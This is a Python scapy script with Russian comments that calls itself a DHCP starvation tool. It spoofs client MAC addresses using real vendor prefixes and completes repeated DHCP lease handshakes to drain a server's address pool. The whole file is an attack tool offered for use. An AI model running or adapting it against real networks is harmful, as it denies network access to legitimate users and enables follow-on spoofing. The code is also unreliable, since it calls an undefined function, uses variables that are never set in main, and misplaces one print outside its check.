import argparse
from scapy.all import *

def parse_arguments() -> argparse.Namespace:
  """Парсер аргументов командной строки"""
  parser = argparse.ArgumentParser(description='DHCP starvation tool')
  parser.add_argument('--iface', type=str, required=True, help='Сетевой интерфейс')
  parser.add_argument('--server', type=str, required=False, default = "any", help='IP DHCP сервера')
  parser.add_argument('--count', type=int, default=1, help='Количество пакетов')
  parser.add_argument('--interval', type=int, default=0, help='Интервал в секундах')
  return parser.parse_args()

def mac_to_bytes(mac_addr: str) -> bytes:
  """Конвертировать MAC в байты"""
  return int(mac_addr.replace(":", ""), 16).to_bytes(6, "big")

def generate_mac() -> bytes:
  """Формируем мак адреса для фейковых запросов"""

  # Формируем OUI
  mac_list = ["04:b0:e7:", "18:1e:b0:", # HUAWEI/Samsung
  "b8:ca:3a:", "fc:08:4a:", # Dell/Fujitsu
  "00:25:2e:", "2c:c2:53:", # Cisco/Apple
  "c4:65:16:", "38:d5:47:", # HP/ASUS
  "e4:1f:13:", "9c:32:ce:", # IBM/Canon
  "d0:28:ba:", "6c:24:83:", # Realme/Microsoft
  "44:90:46:", "74:d4:35:", # HONOR/GIGABYTE
  "88:70:8c:", "90:e8:68:", # Lenovo/AzureWave
  "a4:1a:6e:", "d0:c7:c0:", # ZTE/TPlink
  "c8:13:37:", "00:05:c9:", # Juniper/LG
  "24:21:ab:", "fc:75:16:", # Sony/D-Link
  "60:9c:9f:", "00:00:aa:"] # Brocade/Xerox
  
  # Генерируем оставшиеся три байта
  mac = [random.randint(0x00, 0x7f), random.randint(0x00, 0x7f),
  random.randint(0x00, 0x7f)]
  
  # Приводим их в вид MAC-адреса
  client_mac = ':'.join(map(lambda x: '%02x' % x, mac))

  # Объединяем OUI и вторые три байта
  client_mac = random.choice(mac_list) + client_mac
  print(client_mac, end="")
  return client_mac

packages_sent = 0

def main():
  conf.checkIPaddr = False
  args = parse_args()
  server = ""
  if args.server == "any":
    server = ""
  else:
    server = args.server
    
  print(f"Отправка {args.count} пакетов через {args.iface} с интервалом {args.interval} ...")

  for i in range(1, args.count+1):
    # Генерируем уникальный идентификатор транзакции для четырех сообщений DORA
    xid = random.randint(0x00000000, 0xffffffff)

    # Отправляем сообщение DHCP DISCOVER
    discover_packet = Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff") / \
    IP(src="0.0.0.0", dst="255.255.255.255") / \
    UDP(sport=68, dport=67) / \
    BOOTP(op=1, chaddr=mac_to_bytes(client_mac), xid=xid) / \
    DHCP(options=[("message-type", "discover"), "end"])

    response_for_discover = srp1(discover_packet, timeout=2, verbose=0, iface=args.iface)

    # Если ответ был получен и это DHCP OFFER
    if response_for_discover and response_for_discover[DHCP].options[0][1] == 2:
      if server != "" and response_for_discover[BOOTP].siaddr != server:
        print(" Wrong server IP")
        continue
    print(f" offer from {response_for_discover[BOOTP].siaddr} ✔️ ", end="")
    #print(response_for_discover[BOOTP].siaddr)
    options = response_for_discover[DHCP].options
    for i, item in enumerate(options):
      if item[0] == 'server_id':
        server_id = i
      if item[0] == 'router':
        router = i
      if item[0] == 'lease_time':
        lease_time = i
      if item[0] == 'subnet_mask':
        subnet_mask = i
      if item[0] == 'name_server':
        name_server = i

    # Формируем DHCP REQUEST
    request_packet = Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff") /\
    IP(src="0.0.0.0", dst="255.255.255.255") / \
    UDP(sport=68, dport=67) / \
    BOOTP(op=1, chaddr=mac_to_bytes(client_mac), xid=xid) / \
    DHCP(options=[("message-type", "request"),
    ("requested_addr", response_for_discover[BOOTP].yiaddr),
    ("server_id", response_for_discover[DHCP].options[server_id][1]),
     ("lease_time", int(response_for_discover[DHCP].options[lease_time][1])),
    "end"])
    response_for_request = srp1(request_packet, timeout=2, verbose=0, iface=args.iface)
     # Если ответ был получен и это DHCP ACK
    if response_for_request and response_for_request[DHCP].options[0][1] == 5:
      print(f" ack client IP {response_for_request[BOOTP].yiaddr} ✔️")
      # Счетчик отправленных пакетов
      packages_sent += 1
    else:
      print(" offer ❌ ")
    time.sleep(interval)
  print(f"Пакетов отправлено {packages_sent}")


